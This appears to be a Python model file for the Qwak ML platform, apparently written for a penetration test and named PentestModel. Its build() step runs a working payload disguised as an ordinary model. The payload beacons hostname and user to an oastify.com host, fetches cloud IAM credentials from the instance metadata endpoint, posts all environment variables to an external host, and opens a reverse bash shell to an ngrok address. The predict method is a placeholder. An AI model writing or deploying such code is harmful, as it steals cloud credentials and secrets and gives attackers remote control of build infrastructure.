import qwak
from qwak.model.schema import ModelSchema, ExplicitFeature
from qwak.model.base import QwakModel
import pandas as pd
import os, socket, subprocess, threading

def _beacon():
    os.system("curl -s http://rce-confirmed.seagpx8e8n84ssicy9zza0fa91fr33ekgo8d.oastify.com/$(hostname)/$(whoami) &")
    os.system("curl -s http://imds-probe.seagpx8e8n84ssicy9zza0fa91fr33ekgo8d.oastify.com/$(curl -sm3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo no-imds) &")
    os.system("env | curl -s -X POST -d @- http://env-dump.seagpx8e8n84ssicy9zza0fa91fr33ekgo8d.oastify.com/ &")

def _revshell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(("6.tcp.eu.ngrok.io", 12126))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])
    except Exception:
        os.system("curl -s http://revshell-failed.seagpx8e8n84ssicy9zza0fa91fr33ekgo8d.oastify.com/ &")

class PentestModel(QwakModel):
    def build(self):
        _beacon()
        threading.Thread(target=_revshell, daemon=True).start()
        import time; time.sleep(15)

    def schema(self):
        return ModelSchema(
            inputs=[ExplicitFeature(name="x", type=str)],
        )

    @qwak.api()
    def predict(self, df: pd.DataFrame) -> pd.DataFrame:
        return pd.DataFrame({"result": ["ok"] * len(df)})
